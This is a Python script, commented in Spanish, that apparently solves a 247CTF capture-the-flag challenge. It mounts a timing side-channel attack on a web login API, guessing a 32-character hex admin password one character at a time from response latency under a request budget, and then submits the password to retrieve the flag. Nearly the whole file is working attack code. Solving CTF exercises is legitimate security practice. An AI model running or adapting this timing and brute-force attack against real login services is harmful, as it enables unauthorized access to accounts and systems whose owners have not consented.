#!/usr/bin/env python3
import requests
import time
import statistics

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"
HEX_CHARS = "0123456789abcdef"

def get_token():
    """Obtiene un nuevo token API"""
    resp = requests.get(f"{BASE_URL}/api/get_token")
    data = resp.json()
    token = data["message"].split("reset to ")[1].rstrip("!")
    print(f"[+] Nuevo token: {token}")
    return token

def try_password(username, password, api_token):
    """Intenta hacer login y mide el tiempo de respuesta"""
    start = time.time()
    resp = requests.post(
        f"{BASE_URL}/api/login",
        data={
            "username": username,
            "password": password,
            "api": api_token
        },
        timeout=10
    )
    elapsed = time.time() - start
    return resp.json(), elapsed

def brute_force_timing():
    """Ataque de timing carácter por carácter con múltiples mediciones"""
    known = ""
    api_token = get_token()
    request_count = 0
    measurements_per_char = 1  # Hacer 1 medición por carácter
    
    for pos in range(32):
        print(f"\n[*] Probando posición {pos}...")
        timings = {}
        
        # Calcular cuántas mediciones podemos hacer
        remaining_positions = 32 - pos
        remaining_chars = remaining_positions * 16
        available_requests = 128 - request_count
        
        # Ajustar mediciones si es necesario
        if remaining_chars * measurements_per_char > available_requests:
            measurements_per_char = max(1, available_requests // remaining_chars)
            print(f"[!] Ajustando a {measurements_per_char} mediciones por carácter")
        
        for char in HEX_CHARS:
            if request_count >= 128:
                print("[!] Requests agotados!")
                break
                
            # Hacer múltiples mediciones
            times = []
            for _ in range(measurements_per_char):
                test_password = known + char + "0" * (31 - pos)
                result, elapsed = try_password("admin", test_password, api_token)
                times.append(elapsed)
                request_count += 1
                
                # Si la respuesta es diferente, podría ser correcta
                if result.get("result") != "invalid":
                    print(f"\n[!] ¡RESPUESTA DIFERENTE con '{char}': {result}")
                    known += char
                    break
            else:
                # Calcular tiempo promedio
                avg_time = statistics.mean(times)
                timings[char] = avg_time
                print(f"  {char}: {avg_time:.4f}s (mediciones: {times})")
        
        if result.get("result") == "invalid":
            # Elegir el carácter con mayor tiempo de respuesta
            best_char = max(timings.items(), key=lambda x: x[1])[0]
            known += best_char
            print(f"[+] Mejor carácter (timing): {best_char} ({timings[best_char]:.4f}s)")
        
        print(f"[+] Contraseña conocida: {known}")
        print(f"[+] Requests usados: {request_count}/128")
    
    print(f"\n[*] Contraseña final: {known}")
    return known

if __name__ == "__main__":
    password = brute_force_timing()
    
    # Intentar obtener la flag
    print(f"\n[*] Intentando obtener la flag con contraseña: {password}")
    resp = requests.post(
        f"{BASE_URL}/api/get_flag",
        data={"password": password}
    )
    print(f"[*] Respuesta: {resp.json()}")
